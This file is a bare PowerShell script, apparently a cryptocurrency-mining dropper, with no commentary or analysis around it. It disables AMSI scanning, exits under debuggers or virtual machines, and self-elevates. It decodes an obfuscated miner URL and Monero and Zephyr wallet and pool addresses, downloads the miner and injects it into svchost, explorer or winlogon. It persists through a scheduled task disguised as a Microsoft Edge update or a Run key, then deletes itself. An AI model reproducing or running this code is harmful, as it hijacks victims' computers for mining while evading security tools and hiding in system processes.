$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
try{[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null),0x01)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]0)}catch{}
if([System.Diagnostics.Debugger]::IsAttached){exit}
$vmProcs=@('vboxservice','vboxtray','vmwaretray','vmtoolsd','xenservice')
foreach($p in $vmProcs){if(Get-Process $p -EA 0){exit}}
if((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*"){exit}
$isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if(-not $isAdmin){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoP -NonI -W Hidden -Exec Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    $psi.Verb="runas"
    [System.Diagnostics.Process]::Start($psi)|Out-Null;exit
}
$k=@(0x42,0x6B,0x2F,0x7A,0x1C,0x8D,0x4E,0x9F)
$minerUrl='aHR0cHM6Ly9naXRodWIuY29tL2Zzb2NpZXR5NDMyMS9zZm9jaWV0eS9yYXcvcmVmcy9oZWFkcy9tYWluL3N2Y2hvc3QuZXhl'
$xmrWallet='ODRSdllHamZEb0tmUWVDMWRRWGd2OVFHM1BqdEFDRjNDR2RacnV1Q3RGRlRnTmpKTTlSeWNEemF6VmlNTlJvblVhR21CQjdvUFZyMk5BejZYWXZRU3E3WU1kNzIzaG4='
$xmrPool='cG9vbC5zdXBwb3J0eG1yLmNvbTozMzMz'
$zephWallet='WkVIUERoN2M2eHZSVUNzVTlEQTh4S3I3eHpOQ3FMRXF3eHlRTlJLeHpkUEFNY0VTeXN2dnZ1MmV1Q2Y1d1BXd0RnRw=='
$zephPool='cG9vbC56ZXBoeXIuem9uZTozMzMz'
function D($a,$b){$c=[Convert]::FromBase64String($a);for($i=0;$i -lt $c.Length;$i++){$c[$i]=$c[$i]-bxor$b[$i%$b.Length]};[Text.Encoding]::UTF8.GetString($c)}
$minerUrl=D $minerUrl $k
$xmrWallet=D $xmrWallet $k
$xmrPool=D $xmrPool $k
$zephWallet=D $zephWallet $k
$zephPool=D $zephPool $k
$lockPath="$env:APPDATA\Microsoft\Windows\swill.lock"
if(Test-Path $lockPath){exit}
New-Item $lockPath -Force|Out-Null
$wc=New-Object Net.WebClient
$wc.Timeout=60000
$minerBytes=$null
try{$minerBytes=$wc.DownloadData($minerUrl)}catch{exit}
if(-not $minerBytes -or $minerBytes.Length -lt 5000000 -or $minerBytes.Length -gt 15000000){exit}
$bestWallet=$xmrWallet
$bestPool=$xmrPool
try{$wc.DownloadString("http://$xmrPool/")|Out-Null}catch{$bestWallet=$zephWallet;$bestPool=$zephPool}
$cores=(Get-WmiObject Win32_Processor).NumberOfLogicalProcessors
if(-not $cores){$cores=2}
$threads=[math]::Max(1,[math]::Floor($cores*0.9))
$args="--wallet=$bestWallet --pool=$bestPool --threads=$threads --keepalive --donate-level=0 --cpu-max-threads-hint=90"
$proc=$null
$processNames=@("svchost","explorer","winlogon")
foreach($pn in $processNames){
    $proc=Get-Process -Name $pn -EA 0|Where-Object{$_.Handle}|Select-Object -First 1
    if($proc){break}
}
if(-not $proc){$proc=Start-Process "C:\Windows\System32\svchost.exe" -WindowStyle Hidden -PassThru;Start-Sleep -Milliseconds 1000}
if(-not $proc){exit}
$k32=Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]public static extern IntPtr OpenProcess(uint a,bool b,uint c);
[DllImport("kernel32.dll")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32.dll")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out UIntPtr w);
[DllImport("kernel32.dll")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr sa,IntPtr p,uint f,IntPtr t);
[DllImport("kernel32.dll")]public static extern bool CloseHandle(IntPtr h);
'@ -Name "K32" -PassThru
$h=$k32::OpenProcess(0x1F0FFF,$false,$proc.Id)
if($h -ne 0){
    $addr=$k32::VirtualAllocEx($h,0,$minerBytes.Length,0x3000,0x40)
    if($addr -ne 0){
        $k32::WriteProcessMemory($h,$addr,$minerBytes,$minerBytes.Length,[ref][UIntPtr]::Zero)
        $argsBytes=[Text.Encoding]::ASCII.GetBytes($args+"`0")
        $argsAddr=$k32::VirtualAllocEx($h,0,$argsBytes.Length,0x3000,0x40)
        if($argsAddr -ne 0){$k32::WriteProcessMemory($h,$argsAddr,$argsBytes,$argsBytes.Length,[ref][UIntPtr]::Zero)}
        $k32::CreateRemoteThread($h,0,0,$addr,$argsAddr,0,0)
    }
    $k32::CloseHandle($h)
}
if($proc){try{$proc.Close()}catch{}}
Start-Sleep -Seconds 5
$minerRunning=Get-Process|Where-Object{$_.ProcessName -eq "svchost" -and $_.CPU -and $_.CPU -gt 2 -and $_.Threads.Count -gt 10}|Select-Object -First 1
if(-not $minerRunning){
    foreach($pn in @("explorer","winlogon")){
        $proc=Get-Process -Name $pn -EA 0|Where-Object{$_.Handle}|Select-Object -First 1
        if($proc){break}
    }
    if($proc){
        $h=$k32::OpenProcess(0x1F0FFF,$false,$proc.Id)
        if($h -ne 0){
            $addr=$k32::VirtualAllocEx($h,0,$minerBytes.Length,0x3000,0x40)
            if($addr -ne 0){
                $k32::WriteProcessMemory($h,$addr,$minerBytes,$minerBytes.Length,[ref][UIntPtr]::Zero)
                $argsBytes=[Text.Encoding]::ASCII.GetBytes($args+"`0")
                $argsAddr=$k32::VirtualAllocEx($h,0,$argsBytes.Length,0x3000,0x40)
                if($argsAddr -ne 0){$k32::WriteProcessMemory($h,$argsAddr,$argsBytes,$argsBytes.Length,[ref][UIntPtr]::Zero)}
                $k32::CreateRemoteThread($h,0,0,$addr,$argsAddr,0,0)
            }
            $k32::CloseHandle($h)
        }
        if($proc){try{$proc.Close()}catch{}}
    }
}
$randNum=Get-Random -Min 1000 -Max 9999
$persistScript="@
`$ErrorActionPreference='SilentlyContinue'
`$wc=New-Object Net.WebClient
`$u='$minerUrl'
`$b=`$wc.DownloadData(`$u)
`$a='$args'
`$proc=Get-Process -Name svchost -EA 0|Select-Object -First 1
if(-not `$proc){`$proc=Start-Process 'C:\Windows\System32\svchost.exe' -WindowStyle Hidden -PassThru;Start-Sleep 1}
if(`$proc){`$k32=Add-Type -MemberDefinition '[DllImport(`"kernel32.dll`")]public static extern IntPtr OpenProcess(uint a,bool b,uint c);[DllImport(`"kernel32.dll`")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);[DllImport(`"kernel32.dll`")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out UIntPtr w);[DllImport(`"kernel32.dll`")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr sa,IntPtr p,uint f,IntPtr t);[DllImport(`"kernel32.dll`")]public static extern bool CloseHandle(IntPtr h);' -Name K32 -PassThru
`$h=`$k32::OpenProcess(0x1F0FFF,`$false,`$proc.Id)
if(`$h -ne 0){`$ad=`$k32::VirtualAllocEx(`$h,0,`$b.Length,0x3000,0x40);if(`$ad -ne 0){`$k32::WriteProcessMemory(`$h,`$ad,`$b,`$b.Length,[ref][UIntPtr]::Zero);`$ab=[Text.Encoding]::ASCII.GetBytes(`$a+''`0'');`$ac=`$k32::VirtualAllocEx(`$h,0,`$ab.Length,0x3000,0x40);if(`$ac -ne 0){`$k32::WriteProcessMemory(`$h,`$ac,`$ab,`$ab.Length,[ref][UIntPtr]::Zero)};`$k32::CreateRemoteThread(`$h,0,0,`$ad,`$ac,0,0)};`$k32::CloseHandle(`$h)}}
"
$persistPath="$env:APPDATA\Microsoft\Windows\p_$randNum.ps1"
$persistScript|Out-File $persistPath -Encoding ASCII -Force
schtasks /create /tn "MicrosoftEdgeUpdate_$randNum" /tr "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" /sc onstart /ru SYSTEM /f 2>$null
if($LASTEXITCODE -ne 0){
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate_$randNum" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" -Force -EA 0
}
Get-ChildItem "$env:TEMP\svc*.ps1" -EA 0|Remove-Item -Force -EA 0
Remove-Item $MyInvocation.MyCommand.Path -Force -EA 0
